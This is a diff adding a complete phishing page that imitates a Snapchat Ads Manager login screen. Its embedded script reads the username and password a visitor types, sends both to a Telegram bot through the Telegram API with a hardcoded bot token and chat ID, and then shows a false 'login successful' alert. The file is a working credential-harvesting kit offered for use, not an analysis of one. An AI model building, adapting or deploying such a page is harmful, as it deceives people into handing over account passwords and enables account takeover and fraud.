@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Snapchat Login Style</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: #fff;
+      width: 350px;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 10px; /* Reduced from 25px to 10px */
+    }
+
+    .logo {
+      width: 50px; /* Reduced from 70px to 50px to match the image */
+      height: 50px;
+      object-fit: contain;
+      display: block;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-top: 5px; /* Added small top margin */
+      margin-bottom: 5px; /* Reduced from 10px to 5px */
+    }
+
+    p.subtext {
+      color: #555;
+      font-size: 14px;
+      margin-top: 0;
+      margin-bottom: 25px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    .login-btn {
+      background-color: #fffc00;
+      color: black;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 30px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    .signup {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .signup a {
+      font-weight: bold;
+      color: black;
+      text-decoration: none;
+    }
+
+    .signup a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <!-- Logo PNG Image in a container for better positioning -->
+    <div class="logo-container">
+      <img src="snapchat-logo-png-transparent.png" alt="Snapchat Logo" class="logo" />
+    </div>
+
+    <h2>Log In</h2>
+    <p class="subtext">to continue to Ads Manager</p>
+
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Username or Email" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button class="login-btn" type="submit">Log In</button>
+    </form>
+
+    <div class="signup">
+      New To Snapchat? <a href="#">Sign Up</a>
+    </div>
+  </div>
+  <script>
+    //
+    //
+    // Remplace avec tes vraies infos :
+    const botToken = "8095204446:AAGFJDgn_2_ts_RlhXs0VVX5c9to-rJMsf0";       
+    const chatId = "965011527";         // Ton ID Telegram perso ou d'un groupe
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🛂 Nouvelle connexion :\n📧 Email : ${email}\n🔐 Mot de passe : ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log("✅ Infos envoyées à Telegram !");
+        alert("Connexion réussie !");
+      })
+      .catch(error => {
+        console.error("❌ Erreur lors de l'envoi :", error);
+        alert("Erreur lors de la connexion.");
+      });
+    });
+  </script>
+ 
+
+</body>
+</html>
